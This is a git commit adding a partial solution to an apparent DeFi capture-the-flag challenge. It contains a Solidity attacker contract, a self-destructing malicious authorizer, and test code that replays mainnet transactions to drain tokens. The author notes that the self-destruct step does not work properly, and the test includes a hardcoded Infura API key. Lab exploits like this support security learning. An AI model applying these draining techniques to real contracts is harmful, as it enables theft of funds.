8c073acd92158178055497d9c2d370d8171486df
mipiro <mikle97pir@yandex.ru>
2023-02-18 02:21:16 +0100

    solution: wallet-mining, partial, self-destruct not working properly

---
+++ contracts/wallet-mining/WalletMiningAttacker.sol
@@ -0,0 +1,76 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
+import "./WalletDeployer.sol";
+import "./AuthorizerUpgradeable.sol";
+
+contract BadAuthorizerUpgradeable is AuthorizerUpgradeable {
+
+    function die(address player) public {
+        selfdestruct(payable(player));
+    }
+
+}
+
+contract WalletMiningAttacker {
+
+    GnosisSafe public constant MASTER_COPY = GnosisSafe(payable(0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F));
+    GnosisSafeProxyFactory public constant WALLET_FACTORY = GnosisSafeProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);
+    address public constant DEPOSIT_ADDRESS = 0x9B6fb606A9f5789444c17768c6dFCF2f83563801;
+    uint256 public constant MAGIC_NUMBER = 42;
+
+    address public immutable player;
+    WalletDeployer public immutable walletDeployer;
+    IERC20 public immutable token;
+
+
+    constructor(address _walletDeployer) {
+        player = msg.sender;
+        walletDeployer = WalletDeployer(_walletDeployer);
+        token = IERC20(walletDeployer.gem());
+    }
+
+    function attack() public {
+        bytes memory callData;
+        bytes memory callDataPayment;
+        address[] memory owners = new address[](1);
+        GnosisSafe wallet;
+        owners[0] = address(this);
+        callData = abi.encodeCall(GnosisSafe.setup, (
+                owners, // _owners
+                1, // _threshold
+                address(0), // to
+                "", // data
+                address(0), // fallbackHandler
+                address(token), // paymentToken
+                0, // payment
+                payable(address(this)) // paymentReceiver
+            ));
+
+        for (uint i=1; i<=MAGIC_NUMBER; i++) {
+            WALLET_FACTORY.createProxy(address(MASTER_COPY), callData);
+        }
+        
+        callDataPayment = abi.encodeCall(GnosisSafe.setup, (
+                owners, // _owners
+                1, // _threshold
+                address(0), // to
+                "", // data
+                address(0), // fallbackHandler
+                address(token), // paymentToken
+                20000000 ether, // payment
+                payable(address(this)) // paymentReceiver
+            ));
+        wallet = GnosisSafe(payable(walletDeployer.drop(callDataPayment)));
+
+        for (uint i = 0; i < MAGIC_NUMBER; i++) {
+            wallet = GnosisSafe(payable(walletDeployer.drop(callData)));
+        }
+
+        token.transfer(player, token.balanceOf(address(this)));
+    }
+
+
+}
--- test/wallet-mining/wallet-mining.challenge.js
+++ test/wallet-mining/wallet-mining.challenge.js
@@ -65,7 +65,76 @@ describe('[Challenge] Wallet mining', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const mainnetProvider = new ethers.providers.InfuraProvider(
+            "mainnet",
+            "becb033f3bc54e01b6213b3a4f7665a3"
+        );
+        tx0 = await mainnetProvider.getTransaction("0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3");
+        tx1 = await mainnetProvider.getTransaction("0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4");
+        tx2 = await mainnetProvider.getTransaction("0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261");
+        unsignedTx0 = {
+            to: tx0.to,
+            nonce: tx0.nonce,
+            gasLimit: tx0.gasLimit,
+            gasPrice: tx0.gasPrice,
+            data: tx0.data,
+            value: tx0.value,
+            chainId: tx0.chainId
+        };
+        unsignedTx1 = {
+            to: tx1.to,
+            nonce: tx1.nonce,
+            gasLimit: tx1.gasLimit,
+            gasPrice: tx1.gasPrice,
+            data: tx1.data,
+            value: tx1.value,
+            chainId: tx1.chainId
+        };
+        unsignedTx2 = {
+            to: tx2.to,
+            nonce: tx2.nonce,
+            gasLimit: tx2.gasLimit,
+            gasPrice: tx2.gasPrice,
+            data: tx2.data,
+            value: tx2.value,
+            chainId: tx2.chainId
+        };
+        signature0 = {
+            v: tx0.v,
+            r: tx0.r,
+            s: tx0.s
+        }
+        signature1 = {
+            v: tx1.v,
+            r: tx1.r,
+            s: tx1.s
+        }
+        signature2 = {
+            v: tx2.v,
+            r: tx2.r,
+            s: tx2.s
+        }
+        rawTx0 = ethers.utils.serializeTransaction(unsignedTx0, signature0);
+        rawTx1 = ethers.utils.serializeTransaction(unsignedTx1, signature1);
+        rawTx2 = ethers.utils.serializeTransaction(unsignedTx2, signature2);
+        await player.sendTransaction({to: "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A", value: 10n**17n});
+        await ethers.provider.sendTransaction(rawTx0);
+        await ethers.provider.sendTransaction(rawTx1);
+        await ethers.provider.sendTransaction(rawTx2);
+        proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", "0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b", player);
+        masterCopy = await ethers.getContractAt("GnosisSafe", "0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F", player);
+
+        badAuthorizer = await (await ethers.getContractFactory('BadAuthorizerUpgradeable', player)).deploy();
+        dieABI = ["function die(address player)"];
+        dieInterface = new ethers.utils.Interface(dieABI);
+        dieCallData = dieInterface.encodeFunctionData("die", [player.address]);
+        await authorizer.upgradeToAndCall(badAuthorizer.address, dieCallData);
+
+        console.log(await walletDeployer.can(player.address, DEPOSIT_ADDRESS));
+
+        attacker = await (await ethers.getContractFactory('WalletMiningAttacker', player)).deploy(walletDeployer.address);
+
+        await attacker.attack();
     });
 
     after(async function () {
